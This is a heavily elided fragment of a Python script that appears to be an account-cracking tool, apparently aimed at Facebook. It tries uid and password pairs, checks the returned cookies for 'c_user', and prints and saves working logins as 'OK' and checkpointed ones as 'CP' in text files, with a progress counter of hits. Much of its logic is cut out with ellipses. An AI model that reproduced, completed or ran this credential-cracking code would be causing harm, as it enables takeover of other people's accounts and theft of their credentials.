...
╠══•>TOOLS                   : FREE         \033[1;96m  ║ \033[1;31m   
...
def FIROZ():
    ...
    print('Ok Ids Saved in /FIROZ-OK❤️.txt')
    print('Cp Ids Saved in /FIROZ-CP😭.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[FIROZ-OK❤️] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[FIROZ-CP😭]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mFIROZ\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
